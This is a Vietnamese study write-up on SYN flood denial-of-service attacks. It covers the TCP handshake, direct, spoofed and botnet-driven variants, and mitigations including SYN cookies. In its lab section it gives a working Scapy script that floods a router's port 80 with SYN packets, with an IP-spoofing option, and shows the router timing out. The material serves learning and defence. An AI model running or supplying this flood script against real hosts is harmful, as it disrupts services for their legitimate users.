# SYN Flooding

## Khái niệm

- Tấn công SYN Flooding là một dạng tấn công từ chối dịch vụ phổ biến , trong đó kẻ tấn công gửi một chuỗi yêu cầu SYN đến hệ thống đích (có thể là bộ định tuyến, tường lửa, Hệ thống ngăn chặn xâm nhập (IPS), v.v.) để tiêu thụ tài nguyên của nó, ngăn chặn các khách hàng kết nối thường xuyên.

Một cuộc tấn công DDoS SYN-flood tận dụng quy trình bắt tay ba bước TCP. Trong điều kiện bình thường, kết nối TCP được thể hiện quy trình 3 bước riêng biệt để tạo được sự kết nối như sau:

- Bước 1: Đầu tiên, máy tấn công gửi 1 packet tin SYN đến Server để yêu cầu kết nối.
- Bước 2: Sau khi tiếp nhận packet SYN, Server phản hồi lại máy khách bằng một packet SYN/ACK, để xác nhận thông tin từ Client.
- Bước 3: Cuối cùng, Client nhận được packet tin SYN/ACK thì sẽ trả lời server bằng packet tin ACK báo với server biết rằng nó đã nhận được packet tin SYN/ACK, kết nối đã được thiết lập và sẵn sàng trao đổi dữ liệu.

![image](https://hackmd.io/_uploads/rJekWP3C6.png)

Để tạo từ chối dịch vụ (DOS), thực tế kẻ tấn công sẽ khai thác sau khi nhận được packet SYN ban đầu từ Client. Server sẽ phản hồi lại 1 hoặc nhiều packet SYN/ACK và chờ đến bước cuối cùng trong quá trình Handshake. Ở đây, cách thức thực hiện của nó như sau:

- Bước 1: Kẻ tấn công sẽ gửi một khối lượng lớn các packet tin SYN đến Server. Được nhắm là mục tiêu và thường là các địa chỉ IP giả mạo.

- Bước 2: Sau đó Server sẽ phản hồi lại từng yêu cầu kết nối. Để lại 1 cổng mở sẵn sàng tiếp nhận và phản hồi.

- Bước 3: Trong khi Server chờ packet ACK ở bước cuối cùng từ Client, packet mà không bao giờ đến. Kẻ tấn công tiếp tục gửi thêm các packet SYN. Sự xuất hiện các packet SYN mới khiến máy chủ tạm thời duy trì kết nối cổng mở mới trong một thời gian nhất định. Một khi các cổng có sẵn được sử dụng thì Server không thể hoạt động như bình thường.

Trong kết nối mạng, khi Server bên này kết nối mở nhưng máy bên kia không kết nối thì được coi là half-open. Trong kiểu tấn công DDos, sau khi server gửi gói tin SYN/ACK nó sẽ phải đợi cho đến khi client trả lời. Đến khi các port trở lại bình thường. Kết quả của kiểu tấn công này được coi là cuộc tấn công half-open.

![image](https://hackmd.io/_uploads/SknZ-Dn0T.png)

![image](https://hackmd.io/_uploads/r1AT4vh0p.png)

![image](https://hackmd.io/_uploads/Hyc2MDhCT.png)

### SYN Flood( half-open) có thể xảy ra theo 3 cách khác nhau

#### Tấn công trực tiếp

- SYN Flood ở những nơi địa chỉ IP không bị giả mạo thì được coi là tấn công trực tiếp.
- Trong cuộc tấn công này, kẻ tấn công không hoàn toàn giấu địa chỉ IP của họ. Kết quả là kẻ tấn công sử dụng duy nhất 1 thiết bị nguồn có địa chỉ IP thực để tạo cuộc tấn công.
- Kẻ tấn công rất dễ bị phát hiện và giảm nhẹ. Để tạo trạng thái half-open trên Server mục tiêu, hacker ngăn chặn máy của họ phản ứng với packet tin SYN/ACK của Server. Điều này thường đạt được nhờ quy tắc tường lửa ngăn chặn các packet tin đi ra ngoài. Packet tin SYN hoặc chọn lọc ra bất kỳ packet tin SYN/ACK xuất hiện trước khi chúng ảnh hưởng những độc hại đến máy người dùng.
- Thực tế thì cách này ít sử dụng (nếu có), việc giảm thiểu cũng khá đơn giản – chỉ cần chặn địa chỉ IP của từng hệ thống độc hại. Nếu kẻ tấn công đang sử dụng Botnet như Mirai Botnet thì họ sẽ thành công trong việc che giấu địa chỉ IP của các thiết bị nhiễm bệnh.

#### Tấn công giả mạo

- Một người dùng có ác tâm cũng có thể giả mạo địa chỉ IP trên mỗi packet tin SYN họ gửi đi để ngăn chặn, giảm thiểu tối đa và làm cho danh tính của họ khó phát hiện hơn. Trong những packet tin có thể bị giả mạo, có những packet tin có thể phát hiện lại nguồn của họ.
- Việc này rất khó để khám phá ra danh tính nhưng không phải là không thể. Đặc biệt là các nhà cung cấp dịch vụ Internet (ISP) sẵn sàng giúp đỡ.
- ![image](https://hackmd.io/_uploads/rkmntw206.png)

#### Tấn công phân tán trực tiếp (DDoS)

- Nếu cuộc tấn công tạo ra bằng cách sử dụng Botnet thì khả năng theo dõi cuộc tấn công trở lại nguồn của nó rất thấp. Với mức độ che giấu được thêm vào, kẻ tấn công có thể có các thiết bị phân tán cũng giả mạo địa chỉ IP mà nó gửi các packet. Nếu người tấn công đang sử dụng botnet như mirai botnet. Nhìn chung họ sẽ thành công trong việc che giấu IP về thiết bị bị nhiễm.

- Bằng cách sử dụng tấn công SYN flood, một kẻ xấu nào đó cố gắng tạo ra sự tấn công Ddos tới thiết bị mục tiêu. Hoặc dịch vụ với lưu lương truy cập ít hơn so với các cuộc tấn công Ddos. Thay cho các cuộc tấn công lớn, nhằm mục đích làm quá tải cơ sở hạ tầng xung quanh mục tiêu. SYN attacks only need to be larger than the available backlog in the target’s operating system. Nếu kẻ tấn công có thể xác định kích thước của backlog và mỗi lần kết nối sẽ mở trong bao lâu trước khi hết thời gian. Kẻ tấn công có thể nhắm mục tiêu các tham số chính xác cần thiết để vô hiệu hóa hệ thống. Có thể bằng cách giảm tổng lưu lượng xuống mức tối thiểu cần thiết để tạo Ddos.

## Phòng tránh

- Tăng hàng đợi backlog
  - Hệ điều hành của thiết bị mà kẻ xấu nhắm vào sẽ có một số kết nối half – open cho phép. Tăng số lượng kết nối half – open là một cách hay để giảm thiểu tấn công SYN. Và để tăng backlog tồn đọng thì hệ thống phải dự trữ thêm bộ nhớ. Nếu bộ nhớ không đủ để xử lý backlog tồn đọng thì hiệu suất làm việc của hệ thống bị ảnh hưởng. Thế nhưng điều này cũng tốt hơn so với từ chối dịch vụ.
- Lặp lại sự kết nối half-open TCP cũ
  - Sau khi backlog được lấp đầy thì lặp lại kết nối half – open TCP cũ là một chiến lược để giảm thiểu cuộc tấn công SYN. Cách thức này yêu cầu trong một thời gian ngắn các kết nối hợp pháp được thiết lập thay vì backlog sẽ chứa nhiều gói SYN độc hại. Tuy nhiên phương án này sẽ thất bại khi các cuộc tấn công trở nên mạnh mẽ hoặc kích thước backlog quá nhỏ.
- SYN cookies
  - Tạo ra một cookie của server là một chiến lược hay ho để hạn chế sự tấn công lũ lượt của SYN. Server sẽ dùng gói packet SYN – ACK để phản hồi từng kết nối và xóa yêu cầu SYN ra khỏi backlog, để port mở sẵn sàng tạo kết nối mới. Hành động này nhằm mục đích tránh rủi ro rớt kết nối khi mà backlog đã được lấp đầy.
  - Nếu gói ACK cuối cùng được chuyển từ client tới server và kết nối đó là một yêu cầu hợp pháp thì server sẽ xây dựng lại SYN backlog. Hạn chế của cách nói trên là làm một số thông tin về kết nối TCP bị mất đi nhưng vẫn tốt hơn khi bị tấn công từ chối dịch vụ.

## SYN Flooding LAB

- mình có máy kali với ip là 192.176.45.104 làm attacker

![image](https://hackmd.io/_uploads/BJzKj0sCa.png)

- máy window 10 có địa chỉ 192.176.45.103 làm user bình thường truy cập vào trang quản trị routerwifi địa chỉ 192.176.45.1

![image](https://hackmd.io/_uploads/HkSojAoAT.png)

- mình dùng đoạn code sau để tấn công Dos
  - Mục tiêu của đoạn mã này là tạo ra một tấn công từ chối dịch vụ (DoS) bằng cách gửi một lượng lớn gói tin TCP SYN tới một máy chủ hoặc thiết bị mạng cụ thể.

```python
from scapy.all import *

# target IP address (should be a testing router/firewall)
target_ip = "192.176.45.1"
# the target port u want to flood
target_port = 80
# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
# add some flooding data (1KB in this case, don't increase it too much,
# otherwise, it won't work.)
raw = Raw(b"X"*1024)
# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected
send(p, loop=1, verbose=0)
```

- đoạn code sẽ:

  - target_ip = "192.176.45.1": Xác định địa chỉ IP của máy chủ hoặc thiết bị mạng mà bạn muốn tấn công.
  - target_port = 80: Xác định cổng mà bạn muốn tấn công.
  - ip = IP(dst=target_ip): Tạo một gói tin IP với địa chỉ IP đích là target_ip.
  - tcp = TCP(sport=RandShort(), dport=target_port, flags="S"): Tạo một gói tin TCP SYN với cổng nguồn ngẫu nhiên (sử dụng RandShort()), cổng đích là target_port, và cờ SYN được đặt để bắt đầu một kết nối.
  - raw = Raw(b"X"\*1024): Tạo dữ liệu gửi đi, trong trường hợp này là 1024 byte dữ liệu gồm toàn ký tự "X".
  - p = ip / tcp / raw: Ghép các lớp gói tin IP, TCP và dữ liệu vào một gói tin duy nhất.
  - send(p, loop=1, verbose=0): Gửi gói tin đã tạo đi. loop=1 chỉ định rằng gói tin sẽ được gửi lại lặp đi lặp lại. verbose=0 chỉ định rằng không có thông báo nào sẽ xuất hiện trong quá trình gửi gói tin.

- mình chạy file trên và quan sát trong wireshark thấy rất nhiều gói tin SYN được gửi

![image](https://hackmd.io/_uploads/r1-E9Aj0T.png)

- cùng với đó mình dùng máy user window 10 ping liên tục để kết nối đến routerwifi

![image](https://hackmd.io/_uploads/rksUqRiRp.png)

![image](https://hackmd.io/_uploads/BJJp5RsCp.png)

- thấy thời gian reply sẽ lâu dần

![image](https://hackmd.io/_uploads/S1UysCo06.png)

- và cuối cùng là time out

![image](https://hackmd.io/_uploads/SyBR50s0p.png)

## Tham khảo

- https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python
